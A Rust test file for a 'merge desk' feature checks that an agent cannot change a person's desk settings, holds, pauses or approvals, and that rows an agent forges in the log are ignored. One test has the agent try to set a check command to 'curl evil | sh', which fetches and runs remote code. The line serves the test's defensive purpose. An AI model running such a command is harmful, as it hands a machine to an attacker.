//! Card #417 (docs/design/merge-desk.md §7, §11 slice 3): a merge desk's
//! settings, holds, pause and OKs are the person's alone. An agent's
//! attempt to write any of them is refused, and a row an agent slips into
//! the log anyway changes nothing.

use crate::common;

use common::*;
use coord::*;
use store::kinds;

const SHA: &str = "3f2a9c1e0b7d4a5b";

fn desk() -> RepoDeskRow {
    RepoDeskRow {
        holder: ALICE.into(),
        trusted: vec!["you".into()],
        checks: vec![DeskCheck {
            command: "cargo test".into(),
            ..DeskCheck::default()
        }],
        ..new_desk(REPO_A, "dev-a")
    }
}

fn with_desk() -> Env {
    let e = Env::new();
    e.c.set_desk(USER, desk()).unwrap();
    e
}

fn refused(r: Result<()>) {
    let err = r.expect_err("an agent's desk write must be refused");
    assert_eq!(err.kind(), ErrorKind::NotAllowed, "{err}");
}

#[test]
fn an_agent_can_write_none_of_the_persons_desk_rows() {
    let e = with_desk();
    let before = e.c.desk(REPO_A).unwrap();

    // repo.desk: the holder, check lines and trusted list.
    let mut taken = desk();
    taken.holder = BOB.into();
    taken.checks[0].command = "curl evil | sh".into();
    taken.trusted.push("stranger".into());
    refused(e.c.set_desk(BOB, taken));
    // desk.hold, desk.pause, desk.ok.
    refused(e.c.hold_desk_pr(BOB, REPO_A, 12, "", false));
    refused(e.c.pause_desk(BOB, REPO_A, true));
    refused(e.c.ok_desk_pr(BOB, REPO_A, 12, SHA));

    assert_eq!(e.c.desk(REPO_A).unwrap(), before);
    for k in [kinds::DESK_HOLD, kinds::DESK_PAUSE, kinds::DESK_OK] {
        assert!(e.rows(k).is_empty(), "{k} written");
    }
    assert_eq!(e.rows(kinds::REPO_DESK).len(), 1);
}

#[test]
fn an_agents_rows_in_the_log_are_ignored() {
    let e = with_desk();
    let before = e.c.desk(REPO_A).unwrap();
    let at = e.clk.now();
    let mut taken = desk();
    taken.holder = BOB.into();
    taken.by = BOB.into();
    taken.at = at;
    e.write_raw(BOB, kinds::REPO_DESK, &taken);
    e.write_raw(
        BOB,
        kinds::DESK_HOLD,
        &DeskHoldRow {
            repo_key: REPO_A.into(),
            pr: 12,
            by: BOB.into(),
            at,
            ..DeskHoldRow::default()
        },
    );
    e.write_raw(
        BOB,
        kinds::DESK_PAUSE,
        &DeskPauseRow {
            repo_key: REPO_A.into(),
            paused: true,
            by: BOB.into(),
            at,
        },
    );
    e.write_raw(
        BOB,
        kinds::DESK_OK,
        &DeskOkRow {
            repo_key: REPO_A.into(),
            pr: 12,
            head_sha: SHA.into(),
            by: BOB.into(),
            at,
        },
    );
    assert_eq!(e.c.desk(REPO_A).unwrap(), before);
    assert_eq!(e.reopen().desk(REPO_A).unwrap(), before);
}

#[test]
fn the_person_holds_pauses_and_okays() {
    let e = with_desk();
    e.c.hold_desk_pr(USER, REPO_A, 12, " after the playtest ", false)
        .unwrap();
    e.c.pause_desk(USER, REPO_A, true).unwrap();
    e.c.ok_desk_pr(USER, REPO_A, 14, SHA).unwrap();
    let d = e.c.desk(REPO_A).unwrap();
    assert_eq!(d.holds[&12].note, "after the playtest");
    assert!(d.pause.as_ref().unwrap().paused);
    assert_eq!(d.oks[&14].head_sha, SHA);

    e.c.hold_desk_pr(USER, REPO_A, 12, "", true).unwrap();
    e.c.pause_desk(USER, REPO_A, false).unwrap();
    let d = e.reopen().desk(REPO_A).unwrap();
    assert!(d.holds.is_empty());
    assert!(!d.pause.unwrap().paused);
    assert_eq!(d.oks.len(), 1);
}

#[test]
fn desk_writes_need_a_desk_and_sane_values() {
    let e = with_desk();
    let none = "remote:github.com/a/none";
    assert!(e.c.hold_desk_pr(USER, none, 1, "", false).is_err());
    assert!(e.c.pause_desk(USER, none, true).is_err());
    assert!(e.c.ok_desk_pr(USER, none, 1, SHA).is_err());
    assert!(e.c.hold_desk_pr(USER, REPO_A, 0, "", false).is_err());
    assert!(e.c.ok_desk_pr(USER, REPO_A, 1, "main").is_err());
    let long = "x".repeat(DESK_NOTE_MAX + 1);
    assert!(e.c.hold_desk_pr(USER, REPO_A, 1, &long, false).is_err());

    // A desk turned off takes no holds.
    let mut off = desk();
    off.enabled = false;
    e.c.set_desk(USER, off).unwrap();
    assert!(e.c.pause_desk(USER, REPO_A, true).is_err());
}
